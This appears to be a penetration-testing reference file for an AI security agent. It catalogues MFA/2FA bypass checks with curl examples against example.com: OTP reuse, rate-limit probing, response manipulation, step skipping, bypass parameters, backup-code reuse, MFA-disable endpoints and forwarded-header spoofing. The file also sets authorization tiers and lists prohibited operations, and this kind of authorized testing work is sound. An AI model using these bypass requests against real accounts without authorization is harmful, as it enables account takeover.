# MFA/2FA Bypass Payload

> ⚠️ **Security Boundary Statement**
>
> This document is for **authorized AppSec assessment reference** only, helping identify MFA/2FA bypass vulnerability risk characteristics.
>
> - All payloads are **technical principle demonstrations**, actual authentication bypass is prohibited
> - MFA bypass payloads are for understanding attack surface only, **do not enable unauthorized access**
> - Validation proves vulnerability existence (bypass mechanism identified), **no actual account takeover**
> - See `SKILL.md` for specific execution boundaries
>
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: MFA bypass is high-risk testing, always use test accounts**

---

## Validation Objectives (Within Security Boundary)

MFA bypass vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| OTP Token Reuse | ✓ Test reuse window | - | Access other user's account |
| OTP Brute Force | ✓ Check rate limit | ✓ Send many attempts | Exhaust all OTP codes |
| Response Manipulation | ✓ Test client-side bypass | - | Modify production response |
| Backup Code Test | ✓ Verify backup mechanism | - | Use backup code for access |
| MFA Disable Check | ✓ Test disable endpoint | ✓ Execute disable | Disable MFA for account |
| Step Skipping | ✓ Identify skip mechanism | - | Skip MFA for login |

**Safe Validation Method**: Test bypass mechanisms on test account only; do not access other users' accounts.

---

## Validation Tier Classification

This payload file uses a **tiered validation approach**:

| Tier | Description | Authorization |
|------|-------------|---------------|
| **Tier 1: Safe Validation** | Mechanism identification, test account verification | No authorization needed (test account) |
| **Tier 2: Authorized Extended** | OTP brute force, MFA disable execution | User explicit authorization required |
| **Tier 3: Theory Reference** | Account takeover concepts | For understanding only, do not execute |

**Default execution**: Only Tier 1 methods on test account.
**Stop condition**: After confirming bypass mechanism exists.

---

## OTP Token Issues

### OTP Token Reuse

**Tier 1: Safe Validation (Test Account)**

```bash
# Step 1: Get OTP code for test account
# Step 2: Login with OTP
curl -X POST "https://api.example.com/v1/auth/login" \
     -H "Content-Type: application/json" \
     -d '{"username":"testuser", "password":"Password1!", "otp":"123456"}'

# Step 3: Try reusing same OTP for second login
curl -X POST "https://api.example.com/v1/auth/login" \
     -H "Content-Type: application/json" \
     -d '{"username":"testuser", "password":"Password1!", "otp":"123456"}'

# Vulnerable: Same OTP accepted twice
# Protected: OTP rejected after first use
```

### OTP Validity Window Too Long

```bash
# Test if OTP valid for extended period (e.g., >30 minutes)
# Get OTP, wait, try again

# Vulnerable: OTP valid for hours/days
# Expected: OTP expires in 1-5 minutes
```

### OTP Not Bound to Session

```bash
# Step 1: Start login for user A, get OTP prompt
curl -X POST "https://api.example.com/v1/auth/login-step1" \
     -d '{"username":"user_A"}'

# Step 2: Intercept OTP code (via email/SMS access for test account)

# Step 3: Use user A's OTP for user B's login attempt
curl -X POST "https://api.example.com/v1/auth/login" \
     -d '{"username":"user_B", "password":"...", "otp":"user_A_otp"}'

# Vulnerable: OTP not bound to specific session/user
# Protected: OTP rejected for different user
```

---

## OTP Brute Force

### Rate Limiting Check

**Tier 1: Safe Validation (Observe Only)**

```bash
# Check if OTP endpoint has rate limiting
# Send a few wrong OTPs and observe response

curl -X POST "https://api.example.com/v1/auth/verify-otp" \
     -d '{"otp":"000001"}'

curl -X POST "https://api.example.com/v1/auth/verify-otp" \
     -d '{"otp":"000002"}'

# Observe:
# - Rate limit header present?
# - Account locked after N attempts?
# - Response time (throttling)?
```

### OTP Brute Force Test (Requires Authorization)

**Tier 2: Authorized Extended**

```bash
# OTP brute force - requires authorization
# 6-digit OTP: 1,000,000 possibilities
# 4-digit OTP: 10,000 possibilities

# Use tools like Burp Intruder with authorization
# Test limited range for proof, do not exhaust all codes
```

**Authorization Requirements**:
1. User explicitly authorizes brute force test in writing
2. Use test account only, not production accounts
3. Limit attempts (e.g., 100-500 for proof)
4. Mark "OTP brute force executed with user authorization"

---

## Response Manipulation

### Client-Side MFA Bypass

**Tier 1: Safe Validation**

```bash
# Test if MFA check is client-side only
# Step 1: Enter wrong OTP
curl -X POST "https://api.example.com/v1/auth/verify-otp" \
     -d '{"otp":"wrong"}'

# Response: {"status": "error", "message": "Invalid OTP"}

# Step 2: Try modifying response client-side
# If frontend checks response.status === "success":
# Change response to {"status": "success"} via proxy

# Vulnerable: Frontend accepts modified response, proceeds to dashboard
# Protected: Backend re-validates before granting access
```

### Status Code Manipulation

```bash
# Try different status codes
curl -X POST "https://api.example.com/v1/auth/verify-otp" \
     -d '{"otp":"wrong"}'

# Intercept and change:
# HTTP 401 -> HTTP 200
# {"error": "invalid"} -> {"success": true}

# Check if backend session created despite invalid OTP
curl -X GET "https://api.example.com/v1/dashboard" \
     -H "Cookie: session=<post_mfa_session>"

# Vulnerable: Dashboard accessible with manipulated response
# Protected: Backend validates, no session created
```

---

## MFA Step Skipping

### Direct Access to Post-MFA Endpoint

**Tier 1: Safe Validation**

```bash
# Normal flow: login -> OTP -> dashboard
# Try accessing dashboard directly after step 1

curl -X POST "https://api.example.com/v1/auth/login" \
     -d '{"username":"testuser", "password":"Password1!"}'
# Response: {"session": "temp_session", "mfa_required": true}

# Try skipping to dashboard with temp_session
curl -X GET "https://api.example.com/v1/dashboard" \
     -H "Cookie: session=temp_session"

# Vulnerable: Dashboard accessible without completing MFA
# Protected: temp_session not valid for dashboard, requires MFA completion
```

### URL Parameter Bypass

```bash
# Try adding mfa_bypass or verified parameter
curl -X GET "https://api.example.com/v1/dashboard?mfa_verified=true" \
     -H "Cookie: session=temp_session"

# Or try mfa_skip parameter
curl -X POST "https://api.example.com/v1/auth/login" \
     -d '{"username":"testuser", "password":"Password1!", "mfa_skip": true}'
```

---

## Backup/Recovery Mechanism Issues

### Backup Code Test

**Tier 1: Safe Validation**

```bash
# Test if backup codes have issues:
# 1. Backup codes don't expire
# 2. Backup codes reusable
# 3. Backup codes not bound to session

# Use test account's backup code once
curl -X POST "https://api.example.com/v1/auth/verify-backup" \
     -d '{"backup_code":"ABCD-1234"}'

# Try reusing same backup code
curl -X POST "https://api.example.com/v1/auth/verify-backup" \
     -d '{"backup_code":"ABCD-1234"}'

# Vulnerable: Backup code reusable
# Protected: Backup code consumed after use
```

### Recovery Email/Phone Bypass

```bash
# Test if recovery mechanism can bypass MFA
# Normal: login -> MFA required -> recovery -> MFA skipped?

curl -X POST "https://api.example.com/v1/auth/recover" \
     -d '{"username":"testuser", "method": "email"}'

# After recovery link click:
curl -X GET "https://api.example.com/v1/auth/recover/verify?token=..."

# Check if MFA still required after recovery
# Vulnerable: Recovery bypasses MFA entirely
# Protected: MFA still required even after recovery
```

---

## MFA Disable Vulnerability

### MFA Disable Endpoint Access

**Tier 1: Safe Validation (Endpoint Discovery)**

```bash
# Check if MFA disable endpoint exists and accessible

# Before MFA completion:
curl -X POST "https://api.example.com/v1/auth/mfa/disable" \
     -H "Cookie: session=temp_session"

# Expected: 403 Forbidden or requires MFA first
# Vulnerable: MFA can be disabled without completing MFA
```

### MFA Disable via API Parameter

```bash
# Try disabling MFA during registration or profile update
curl -X POST "https://api.example.com/v1/users/register" \
     -d '{"username":"testuser", "password":"Password1!", "mfa_enabled": false}'

curl -X PUT "https://api.example.com/v1/users/profile" \
     -d '{"mfa_enabled": false}'

# Vulnerable: MFA can be disabled via parameter
# Protected: MFA enable/disable requires separate authenticated flow
```

---

## Conditional MFA Bypass

### Conditional MFA Logic Flaw

```bash
# Test if MFA only triggered under certain conditions
# Bypass by meeting alternative condition

# Example: MFA only for "sensitive" actions
curl -X POST "https://api.example.com/v1/auth/login" \
     -d '{"username":"testuser", "password":"Password1!", "action": "normal"}'

# Try with "action": "view_only" or "read_only"
# Vulnerable: MFA skipped for certain action types
```

### IP/Device-Based MFA Bypass

```bash
# Test if MFA skipped for "trusted" IP or device

curl -X POST "https://api.example.com/v1/auth/login" \
     -H "X-Forwarded-For: <trusted_ip>" \
     -d '{"username":"testuser", "password":"Password1!"}'

# Or with trusted device header
curl -X POST "https://api.example.com/v1/auth/login" \
     -H "X-Device-ID: <trusted_device>" \
     -d '{"username":"testuser", "password":"Password1!"}'

# Vulnerable: MFA bypassed with spoofed header
# Protected: Backend validates device/IP properly
```

---

## Analysis Process

### Tier 1: Default Validation (Test Account)

1. Create/login test account with MFA enabled
2. Test OTP reuse (same code twice)
3. Test OTP validity window (wait and retry)
4. Test session binding (OTP for different user)
5. Check rate limiting (few wrong OTPs)
6. Test response manipulation (client-side bypass)
7. Test step skipping (direct dashboard access)
8. Test backup/recovery mechanism issues
9. **Stop validation**, document bypass mechanism found

### Tier 2: Authorized Extended

10. OTP brute force (limited attempts)
11. MFA disable execution
12. IP/device spoofing exploitation

---

## Severity Classification

MFA bypass harm does not depend on "bypass mechanism itself" but on**actual reachable operation value after bypass**. Technical bypass with subsequent risk control / no sensitive operations = harm greatly reduced. 

**Base severity** (by bypass mechanism)+ **Reachability modifier** (by what can be done after bypass):

| Bypass Type | Base severity | Note |
|-------------|---------|------|
| MFA disable without auth | Critical | Protection removed, usually directly high-risk |
| Step skipping / completely bypasses MFA | High | MFA effectively useless |
| Client-side bypass | High | Frontend validation, bypassable |
| Recovery bypasses MFA | High | Recovery flow bypasses MFA |
| OTP reuse | Medium | Requires replay window + replay opportunity |
| Backup code reuse | Medium | Requires having obtained backup code |
| Missing rate limit | Low/Medium | Only brute-force possible, not deterministic bypass |

**Reachability modifier** (adjust on base severity):

| Actual case after bypass | Modifier |
|---------------|------|
| Can directly login to takeover real account + Account has sensitive data/funds/permissions | Maintain or upgrade (-> Critical) |
| Can login but account is test-only / Subsequent operations have independent risk control | Downgrade one level |
| Proof only bypass mechanism exists, did not actually enter account (boundary limited) | Base severity downgrade one level, mark "full takeover not verified" |
| bypassIs low-value account system (e.g. read-only community account, no sensitive operations) | Downgrade to Medium or below |

**Key judgment**: Prerequisite for reporting MFA bypass as High is "bypass = account takeover" chain holds. If only mechanism proven due to test boundary, takeover not verified, must note in finding "mechanism confirmed, full takeover not verified"; cannot directly report Critical.

---

## Output

```markdown
## Vulnerability: MFA/2FA Bypass

### Location
{URL} - {endpoint}

### Bypass Type
{OTP Reuse / Client-Side Bypass / Step Skipping}

### Proof Payload
Reuse OTP: 123456 accepted twice for login

### Validation Result
- First login with OTP: Success
- Second login with same OTP: Success (vulnerable)
- Expected: OTP rejected after first use

### Risk Level
{Determined by base severity + reachability modifier; note actual reachable operation value after bypass; full takeover not verified must downgrade one level}
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Brute force without authorization | Do not send sustained OTP attempts |
| ❌ Access other users' accounts | Do not test on production accounts |
| ❌ Disable MFA for real accounts | Do not modify security settings for others |
| ❌ Account takeover | Do not complete full bypass chain |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Prove existence, do not enable harm"
- `templates/severity-classification.md` -> MFA bypass severity rules
- Use **test account only** for all MFA bypass testing